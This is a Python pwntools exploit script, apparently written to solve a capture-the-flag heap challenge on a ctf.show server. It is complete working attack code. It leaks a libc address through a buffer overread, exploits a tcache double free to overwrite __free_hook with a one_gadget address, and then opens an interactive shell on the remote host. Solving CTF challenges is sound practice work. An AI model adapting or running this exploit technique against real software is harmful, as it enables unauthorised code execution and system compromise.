from pwn import *
context(arch = 'amd64',os = 'linux',log_level = 'debug')
#io = process('./pwn')
io = remote('pwn.challenge.ctf.show',28262)
libc = ELF('/home/bit/libc/64bit/libc-2.27.so')
def create(payload):
    io.sendlineafter("choice: ",'0')
    io.sendlineafter("user: ",'0')
    io.sendafter("username: ",payload)
def edit(payload):
    io.sendlineafter("choice: ",'1')
    io.sendlineafter("user: ",'0')
    io.sendafter("username: ",payload)
def delete():
    io.sendlineafter("choice: ",'2')
def sendMessage(payload):
    io.sendlineafter("choice: ",'3')
    io.sendafter("sent: \n",payload)
payload = 'a' * (7 + 8 * 12) + '-'
sendMessage(payload)
io.recvuntil("a-")
leaked = u64(io.recv(6).ljust(8,'\x00'))
libc_base = leaked - libc.symbols["puts"] - 418
free_hook = libc_base + libc.symbols["__free_hook"]
system = libc_base + libc.symbols["system"]
one_gadget = libc_base + 0x4f322
create('\n')
delete()
delete()
sendMessage(p64(free_hook))
sendMessage("pass")
sendMessage(p64(one_gadget))
delete()
io.interactive()
